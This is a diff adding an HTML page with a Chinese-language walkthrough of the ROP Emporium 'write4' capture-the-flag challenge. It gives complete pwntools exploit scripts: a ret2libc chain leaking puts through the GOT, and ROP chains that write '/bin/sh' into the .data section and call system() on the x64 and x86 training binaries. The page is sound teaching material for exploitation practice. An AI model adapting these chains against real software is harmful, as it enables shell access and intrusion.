@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="zh-CN" >
+<head>
+  <meta charset="utf-8" /><meta name="generator" content="Docutils 0.17.1: http://docutils.sourceforge.net/" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>write4 &mdash; rop emporium writeup  文档</title>
+      <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
+      <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  <!--[if lt IE 9]>
+    <script src="../_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+        <script data-url_root="../" id="documentation_options" src="../_static/documentation_options.js"></script>
+        <script src="../_static/jquery.js"></script>
+        <script src="../_static/underscore.js"></script>
+        <script src="../_static/doctools.js"></script>
+        <script src="../_static/translations.js"></script>
+    <script src="../_static/js/theme.js"></script>
+    <link rel="index" title="索引" href="../genindex.html" />
+    <link rel="search" title="搜索" href="../search.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+            <a href="../index.html" class="icon icon-home"> rop emporium writeup
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="在文档中搜索" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <!-- Local TOC -->
+              <div class="local-toc"><ul>
+<li><a class="reference internal" href="#">write4</a><ul>
+<li><a class="reference internal" href="#cord-cut">Cord cut</a></li>
+<li><a class="reference internal" href="#read-write">Read/Write</a></li>
+<li><a class="reference internal" href="#what-where">What/Where</a></li>
+<li><a class="reference internal" href="#decisions-decisions">Decisions, decisions</a></li>
+<li><a class="reference internal" href="#so-much-room-for-activities">So much room for activities</a></li>
+<li><a class="reference internal" href="#x64">x64</a></li>
+<li><a class="reference internal" href="#x86">x86</a></li>
+</ul>
+</li>
+</ul>
+</div>
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">rop emporium writeup</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../index.html" class="icon icon-home"></a> &raquo;</li>
+      <li>write4</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../_sources/3_write4/README.md.txt" rel="nofollow"> 查看页面源码</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="write4">
+<h1>write4<a class="headerlink" href="#write4" title="永久链接至标题"></a></h1>
+<p>via：https://ropemporium.com/challenge/write4.html</p>
+<p>Our first foray into proper gadget use. A call to system() is still present but we’ll need to write a string into memory somehow.
+Click below to download the binary.</p>
+<p><a class="reference external" href="https://ropemporium.com/binary/write4.zip">64bit</a> <a class="reference external" href="https://ropemporium.com/binary/write432.zip">32bit</a></p>
+<section id="cord-cut">
+<h2>Cord cut<a class="headerlink" href="#cord-cut" title="永久链接至标题"></a></h2>
+<p>On completing our usual checks for interesting strings and symbols in this binary we’re confronted with the stark truth that our favourite string “/bin/cat flag.txt” is not present this time. Although you’ll see later that there are other ways around this problem, such as resolving dynamically loaded libraries and using the strings present in those, we’ll stick to the challenge goal which is learning how to get data into the target process’s virtual address space via the magic of ROP.</p>
+</section>
+<section id="read-write">
+<h2>Read/Write<a class="headerlink" href="#read-write" title="永久链接至标题"></a></h2>
+<p>The important thing to realise is that ROP is just a form of arbitrary code execution and if we’re creative we can leverage it to do things like write to or read from memory. The question is what mechanism are we going to use to solve this problem, is there any built-in functionality to do the writing or do we need to use gadgets? In this challenge we won’t be using built-in functionality since that’s too similar to the previous challenges, instead we’ll be looking for gadgets that let us write a value to memory such as mov [reg], reg. Nonetheless it is possible to solve this challenge by leveraging functions like fgets() to write to memory locations of your choosing so it’s worth trying to do it that way once you’ve solved it using the intended technique.</p>
+</section>
+<section id="what-where">
+<h2>What/Where<a class="headerlink" href="#what-where" title="永久链接至标题"></a></h2>
+<p>Perhaps the most important thing to consider in this challenge is <strong>where</strong> we’re going to write our string. Use rabin2 or readelf to check out the different sections of this binary and their permissions. Learn a little about ELF sections and their purpose. Consider how much space each section might give you to work with and whether corrupting the information stored at these locations will cause you problems later if you need some kind of stability from this binary.</p>
+</section>
+<section id="decisions-decisions">
+<h2>Decisions, decisions<a class="headerlink" href="#decisions-decisions" title="永久链接至标题"></a></h2>
+<p>Once you’ve figured out how to write your string into memory and where to write it, go ahead and call system() with its location as your only argument. Are you going to cat flag.txt or drop a shell with /bin/sh? Try to wrap some of your functionality in helper functions, if you can write a 4 or 8 byte value to a location in memory, can you craft a function (in python using pwntools for example) that takes a string and a memory location and returns a ROP chain that will write that string to your chosen location? Crafting templates like this will make your life much easier in the long run.</p>
+</section>
+<section id="so-much-room-for-activities">
+<h2>So much room for activities<a class="headerlink" href="#so-much-room-for-activities" title="永久链接至标题"></a></h2>
+<p>There are indeed three very different ways to solve the 64 bit version of this challenge, including the intended method. Built-in functionality will give you a win if you’re willing to borrow a technique from the ‘pivot’ challenge and an oversight in how the pwnme() function was constructed can get you a shell in a single link chain 🤫</p>
+</section>
+<section id="x64">
+<h2>x64<a class="headerlink" href="#x64" title="永久链接至标题"></a></h2>
+<p>这个题目我是用 ROP + ret2libc 去解的，因为给的程式本身没有 /bin/sh 所以我就跳到 libc 去拿</p>
+<p>开了 aslr ，libc 的基地址是随机的</p>
+<p>查到 /bin/sh 在 libc 的偏移</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">bin_sh</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&quot;/bin/sh</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">))</span>
+</pre></div>
+</div>
+<p>第一次溢出我用 puts 泄露出 puts 的 got</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">puts_offset</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;puts&quot;</span><span class="p">]</span>
+<span class="n">puts_got</span> <span class="o">=</span> <span class="n">write4</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+<span class="n">puts_plt</span> <span class="o">=</span> <span class="n">write4</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&quot;puts&quot;</span><span class="p">]</span>
+<span class="n">pwnme</span> <span class="o">=</span> <span class="n">write4</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;pwnme&quot;</span><span class="p">]</span>
+
+<span class="n">exp</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mh">0x28</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pwnme</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>然后用这个地址减去 puts 在 libc 的偏移量就能拿到 libc 的基地址</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;write4&quot;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">())</span>
+<span class="c1"># p.recvuntil(&quot;&gt; &quot;)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exp</span><span class="p">)</span>
+<span class="n">puts_got_libc</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()[:</span><span class="mi">8</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffff</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_got_libc</span> <span class="o">-</span> <span class="n">puts_offset</span>
+<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+</pre></div>
+</div>
+<p>用基地址加上这个偏移量就能得到 /bin/sh 的真正的线性地址，第二次溢出，成功执行 <code class="docutils literal notranslate"><span class="pre">system(&quot;/bin/sh&quot;);</span></code></p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">exp0</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mh">0x28</span>
+<span class="n">exp0</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>
+<span class="n">exp0</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">bin_sh</span><span class="p">)</span>
+<span class="n">exp0</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_plt</span><span class="p">)</span>
+<span class="n">exp0</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pwnme</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exp0</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;cat flag.txt&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+</div>
+<p>完整的 payload：</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;tmux&quot;</span><span class="p">,</span> <span class="s2">&quot;split-window&quot;</span><span class="p">,</span> <span class="s2">&quot;-h&quot;</span><span class="p">]</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><span class="p">)</span>
+<span class="n">write4</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;write4&quot;</span><span class="p">)</span>
+<span class="n">bin_sh</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&quot;/bin/sh</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">))</span>
+<span class="n">system_plt</span> <span class="o">=</span> <span class="n">write4</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&quot;system&quot;</span><span class="p">]</span>
+<span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x0000000000400893</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="mh">0x0</span>
+<span class="n">puts_offset</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;puts&quot;</span><span class="p">]</span>
+<span class="n">puts_got</span> <span class="o">=</span> <span class="n">write4</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+<span class="n">puts_plt</span> <span class="o">=</span> <span class="n">write4</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&quot;puts&quot;</span><span class="p">]</span>
+<span class="n">pwnme</span> <span class="o">=</span> <span class="n">write4</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;pwnme&quot;</span><span class="p">]</span>
+
+<span class="n">exp</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mh">0x28</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pwnme</span><span class="p">)</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;write4&quot;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">())</span>
+<span class="c1"># p.recvuntil(&quot;&gt; &quot;)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exp</span><span class="p">)</span>
+<span class="n">puts_got_libc</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()[:</span><span class="mi">8</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffff</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_got_libc</span> <span class="o">-</span> <span class="n">puts_offset</span>
+<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+
+<span class="c1"># gdb.attach(pidof(p)[0])</span>
+
+<span class="n">exp0</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mh">0x28</span>
+<span class="n">exp0</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>
+<span class="n">exp0</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">bin_sh</span><span class="p">)</span>
+<span class="n">exp0</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_plt</span><span class="p">)</span>
+<span class="n">exp0</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pwnme</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exp0</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;cat flag.txt&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+</div>
+<p>这里很奇怪，我在 <code class="docutils literal notranslate"><span class="pre">ubuntu:19.04</span></code> 下这个 <code class="docutils literal notranslate"><span class="pre">payload</span></code> 是打不动的</p>
+<p><img alt="2020-05-0202.53.14" src="../_images/2020-05-0202.53.14.png" /></p>
+<p>我动态调试过了，调用没有问题</p>
+<p><img alt="image-20200502030045980" src="../_images/image-20200502030045980.png" /></p>
+<p><img alt="image-20200502030123382" src="../_images/image-20200502030123382.png" /></p>
+<p>可以看到 <code class="docutils literal notranslate"><span class="pre">do_system</span> <span class="pre">(line=0x7f16202fa613</span> <span class="pre">&quot;/bin/sh&quot;)</span></code></p>
+<p>但是我就是拿不到 <code class="docutils literal notranslate"><span class="pre">shell</span></code>，<code class="docutils literal notranslate"><span class="pre">dmesg</span> <span class="pre">-c</span></code> 都懒得管了</p>
+<p>然后我在 <code class="docutils literal notranslate"><span class="pre">ubuntu:16.04</span></code> 上跑</p>
+<p><img alt="image-20200502030525111" src="../_images/image-20200502030525111.png" /></p>
+<p>其实这个解法并不是官方的期望解法</p>
+<p>其实还有别的解法</p>
+<p>当时在 Ghidra 的时候我有看到一个函数：<code class="docutils literal notranslate"><span class="pre">usefulGadgets()</span></code></p>
+<p><img alt="image-20200502031145846" src="../_images/image-20200502031145846.png" /></p>
+<p>其实这是官方故意写的，里面就有两句汇编</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>        <span class="m">00400820</span> 4d <span class="m">89</span> 3e        MOV        qword ptr <span class="o">[</span>R14<span class="o">]</span>,R15
+        <span class="m">00400823</span> c3              RET
+</pre></div>
+</div>
+<p>回去到上面去看官方 Read/Write 描述，意思很明显，不就是没有 <code class="docutils literal notranslate"><span class="pre">/bin/cat</span> <span class="pre">flag.txt</span></code> 吗，现在给你一个写入内存的机会，你把字符串写进去</p>
+<p><code class="docutils literal notranslate"><span class="pre">MOV</span>&#160; <span class="pre">qword</span> <span class="pre">ptr</span> <span class="pre">[R14],R15</span></code> 的意思是：把 <code class="docutils literal notranslate"><span class="pre">r15</span></code> 寄存器里的东西，写入 <code class="docutils literal notranslate"><span class="pre">r14</span></code> 寄存器所存的地址中去</p>
+<p>就是一个任意地址（fake 任意）写，现在有了这个还不行，得想办法设置 r14 和 r15 寄存器的内容</p>
+<p>先看一下每个段的权限，找个地方写入 <code class="docutils literal notranslate"><span class="pre">/bin/cat</span> <span class="pre">flag.txt</span></code></p>
+<p><img alt="image-20200502030829587" src="../_images/image-20200502030829587.png" /></p>
+<p>可以看到</p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>19  0x00000e10    0x8 0x00600e10    0x8 -rw- .init_array
+20  0x00000e18    0x8 0x00600e18    0x8 -rw- .fini_array
+21  0x00000e20    0x8 0x00600e20    0x8 -rw- .jcr
+22  0x00000e28  0x1d0 0x00600e28  0x1d0 -rw- .dynamic
+23  0x00000ff8    0x8 0x00600ff8    0x8 -rw- .got
+24  0x00001000   0x50 0x00601000   0x50 -rw- .got.plt
+25  0x00001050   0x10 0x00601050   0x10 -rw- .data
+26  0x00001060    0x0 0x00601060   0x30 -rw- .bss
+</pre></div>
+</div>
+<p>直接选写入 <code class="docutils literal notranslate"><span class="pre">.data</span></code> 段吧，我们要把 <code class="docutils literal notranslate"><span class="pre">r14</span></code> 的值设置为 <code class="docutils literal notranslate"><span class="pre">0x00601050</span></code>，<code class="docutils literal notranslate"><span class="pre">r15</span></code> 寄存器的值设置为 <code class="docutils literal notranslate"><span class="pre">/bin/sh</span></code>，因为 <code class="docutils literal notranslate"><span class="pre">/bin/cat</span> <span class="pre">flag.txt</span></code> 的长度超过了了 <code class="docutils literal notranslate"><span class="pre">r15</span></code> 所能容纳的大小</p>
+<p>设置寄存器，输入都是在栈上，当然是要找 <code class="docutils literal notranslate"><span class="pre">pop</span></code> 了，直接 <code class="docutils literal notranslate"><span class="pre">ROPgadget</span></code> 找</p>
+<p><img alt="image-20200502032544226" src="../_images/image-20200502032544226.png" /></p>
+<p>找到了：<code class="docutils literal notranslate"><span class="pre">pop</span> <span class="pre">r14</span> <span class="pre">;</span> <span class="pre">pop</span> <span class="pre">r15</span> <span class="pre">;</span> <span class="pre">ret</span></code> ，地址：<code class="docutils literal notranslate"><span class="pre">0x0000000000400890</span></code></p>
+<p>现在参数的问题解决的，直接用 <code class="docutils literal notranslate"><span class="pre">pwntools</span></code> 的 <code class="docutils literal notranslate"><span class="pre">ELF.plt</span></code> 就能得到 <code class="docutils literal notranslate"><span class="pre">system</span></code> 的 <code class="docutils literal notranslate"><span class="pre">plt</span></code>。</p>
+<p>漏洞点位于 <code class="docutils literal notranslate"><span class="pre">pwnme</span></code> 的 <code class="docutils literal notranslate"><span class="pre">fgets</span></code></p>
+<p><img alt="image-20200502033132006" src="../_images/image-20200502033132006.png" /></p>
+<p>填充到返回地址需要：<code class="docutils literal notranslate"><span class="pre">0x20</span> <span class="pre">+</span> <span class="pre">0x8</span> <span class="pre">=</span> <span class="pre">0x28</span></code> Bytes</p>
+<p>还有就是，<code class="docutils literal notranslate"><span class="pre">system</span></code> 参数是要放到 <code class="docutils literal notranslate"><span class="pre">rdi</span></code> 里面的，还需要一个 <code class="docutils literal notranslate"><span class="pre">pop</span> <span class="pre">rdi;</span> <span class="pre">ret</span></code>，看上面的 ROPgadget 的结果，位于：<code class="docutils literal notranslate"><span class="pre">0x0000000000400893</span></code></p>
+<p>万事俱备，写 payload：</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1">#context.terminal = [&quot;tmux&quot;, &quot;split-window&quot;, &quot;-h&quot;]</span>
+<span class="n">write4</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./write4&quot;</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./write4&quot;</span><span class="p">)</span>
+<span class="n">system_plt</span> <span class="o">=</span> <span class="n">write4</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&quot;system&quot;</span><span class="p">]</span>
+<span class="n">data_section</span> <span class="o">=</span> <span class="mh">0x00601050</span>
+<span class="n">pop_r14_pop_r15_ret</span> <span class="o">=</span> <span class="mh">0x0000000000400890</span>
+<span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x0000000000400893</span>
+<span class="n">mov_r14_r15_ret</span> <span class="o">=</span> <span class="mh">0x00400820</span>
+<span class="n">bin_sh_str</span> <span class="o">=</span> <span class="s2">&quot;/bin/sh</span><span class="se">\x00</span><span class="s2">&quot;</span>
+
+<span class="n">exp</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mh">0x28</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_r14_pop_r15_ret</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">data_section</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">bin_sh_str</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mov_r14_r15_ret</span><span class="p">)</span>
+
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">data_section</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_plt</span><span class="p">)</span>
+
+<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">pidof</span><span class="p">(</span><span class="n">p</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exp</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+</div>
+<p>看 DISASM 和 STACK 窗口，和预期的一样</p>
+<p><img alt="image-20200502035750202" src="../_images/image-20200502035750202.png" /></p>
+<p>成功拿到 shell</p>
+<p><img alt="image-20200502035933665" src="../_images/image-20200502035933665.png" /></p>
+<p>pwn！</p>
+<p>其实我们的 payload 用到的 gadget 拼起来就是这样的：</p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>  0x400804 &lt;pwnme+79&gt;               nop    
+   0x400805 &lt;pwnme+80&gt;               leave  
+   0x400806 &lt;pwnme+81&gt;               ret    
+    ↓
+   0x400890 &lt;__libc_csu_init+96&gt;     pop    r14
+ ► 0x400892 &lt;__libc_csu_init+98&gt;     pop    r15
+   0x400894 &lt;__libc_csu_init+100&gt;    ret    
+    ↓
+   0x400820 &lt;usefulGadgets&gt;          mov    qword ptr [r14], r15
+   0x400823 &lt;usefulGadgets+3&gt;        ret    
+    ↓
+   0x400893 &lt;__libc_csu_init+99&gt;     pop    rdi
+   0x400894 &lt;__libc_csu_init+100&gt;    ret    
+    ↓
+   0x4005e0 &lt;system@plt&gt;             jmp    qword ptr [rip + 0x200a3a] &lt;0x601020&gt;
+</pre></div>
+</div>
+<p>看到了吗，其实就是这样</p>
+<p>其实还有一种解法，就是 <code class="docutils literal notranslate"><span class="pre">.got</span></code> 是可写的，我们可以改 <code class="docutils literal notranslate"><span class="pre">.got</span></code> 从而劫持程序流程，我就不写了</p>
+</section>
+<section id="x86">
+<h2>x86<a class="headerlink" href="#x86" title="永久链接至标题"></a></h2>
+<p>一样的思路，这个也有一个 <code class="docutils literal notranslate"><span class="pre">usefulGadgets()</span></code> 函数</p>
+<p><img alt="image-20200502040955015" src="../_images/image-20200502040955015.png" /></p>
+<p>可以：</p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>        08048670 89 2f           MOV        dword ptr [EDI],EBP
+        08048672 c3              RET
+</pre></div>
+</div>
+<p>好了，不啰嗦，现在凌晨 4 点多了</p>
+<p>找</p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span><span class="nf">pop</span> <span class="no">ebp</span> <span class="c1">; ret</span>
+<span class="nf">pop</span> <span class="no">edi</span><span class="c1">; ret</span>
+</pre></div>
+</div>
+<p><img alt="image-20200502041247258" src="../_images/image-20200502041247258.png" /></p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>0x080486da : pop edi ; pop ebp ; ret
+</pre></div>
+</div>
+<p>位于：<code class="docutils literal notranslate"><span class="pre">0x080486da</span></code></p>
+<p><img alt="image-20200502041352096" src="../_images/image-20200502041352096.png" /></p>
+<p>看到 <code class="docutils literal notranslate"><span class="pre">.data</span></code> 可写：<code class="docutils literal notranslate"><span class="pre">0x0804a028</span></code></p>
+<p><code class="docutils literal notranslate"><span class="pre">pwnme</span></code> 的 <code class="docutils literal notranslate"><span class="pre">fgets</span></code></p>
+<p><img alt="image-20200502041525216" src="../_images/image-20200502041525216.png" /></p>
+<p>填充长度：<code class="docutils literal notranslate"><span class="pre">0x28</span> <span class="pre">+</span> <span class="pre">0x4</span> <span class="pre">=</span> <span class="pre">0x2c</span></code></p>
+<p>好了 写 payload：</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./write432&quot;</span><span class="p">)</span>
+<span class="n">write432</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./write432&quot;</span><span class="p">)</span>
+
+<span class="n">system_plt</span> <span class="o">=</span> <span class="n">write432</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&quot;system&quot;</span><span class="p">]</span>
+<span class="n">data_section</span> <span class="o">=</span> <span class="mh">0x0804a028</span>
+<span class="n">mov_edi_ebp_ret</span> <span class="o">=</span> <span class="mh">0x08048670</span>
+<span class="n">pop_edi_pop_ebp_ret</span> <span class="o">=</span> <span class="mh">0x080486da</span>
+<span class="n">bin_sh_str</span> <span class="o">=</span> <span class="s2">&quot;bash&quot;</span>
+
+<span class="n">exp</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mh">0x2c</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_edi_pop_ebp_ret</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">data_section</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">bin_sh_str</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">mov_edi_ebp_ret</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_plt</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">data_section</span><span class="p">)</span>
+
+<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">pidof</span><span class="p">(</span><span class="n">p</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exp</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+</div>
+<p><img alt="image-20200502044740438" src="../_images/image-20200502044740438.png" /></p>
+<p>看 DISASM 流程执行正常</p>
+<p><img alt="image-20200502044838773" src="../_images/image-20200502044838773.png" /></p>
+<p>pwn！</p>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; 版权所有 2021, scriptk1d.</p>
+  </div>
+
+  利用 <a href="https://www.sphinx-doc.org/">Sphinx</a> 构建，使用了 
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">主题</a>
+    由 <a href="https://readthedocs.org">Read the Docs</a>开发.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
